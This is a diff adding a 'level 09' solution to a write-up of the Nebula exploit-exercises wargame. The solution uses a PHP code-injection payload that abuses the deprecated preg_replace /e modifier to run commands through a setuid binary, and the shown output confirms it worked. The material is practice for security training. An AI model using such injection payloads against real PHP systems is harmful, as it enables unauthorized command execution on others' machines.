@@ -5,6 +5,22 @@ nebula-exercises
 > [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)
 
 
+level 09
+--------
+
+##### see the deprecated \e option vulnerability of preg_replace php function
+> ref: https://wiki.php.net/rfc/remove_preg_replace_eval_modifier
+
+##### exploit $use_me to call getflag from the suid flag09 binary
+```bash
+level09@nebula:~$ echo '[email {${eval(system($use_me))}}]' > /tmp/getflag09.txt
+level09@nebula:~$ /home/flag09/flag09 /tmp/getflag09.txt getflag
+You have successfully executed getflag on a target account
+PHP Parse error:  syntax error, unexpected T_STRING in /home/flag09/flag09.php(15) : regexp code(1) : eval()'d code on line 1
+PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1
+```
+
+
 level 10
 --------
 
